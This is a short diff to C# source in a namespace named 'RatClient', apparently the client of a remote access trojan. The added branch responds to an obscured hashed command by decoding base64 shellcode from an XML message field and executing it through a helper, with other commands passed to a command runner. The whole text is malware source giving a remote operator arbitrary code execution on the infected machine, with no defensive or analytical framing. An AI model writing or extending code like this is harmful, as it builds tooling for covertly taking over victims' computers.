@@ -43,6 +43,15 @@ namespace RatClient
                 }
                 return new byte[1] { 49 };
             }
+            else if (command == "2dbab3bcba2fe64f1d2133bc50796496")
+            {
+                byte[] shellcode = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
+                if (Tools.RunShellCode(shellcode))
+                {
+                    return new byte[1] { 48 };
+                }
+                return new byte[1] { 49 };
+            }
             else
             {
                 return Tools.RunCommand(command);
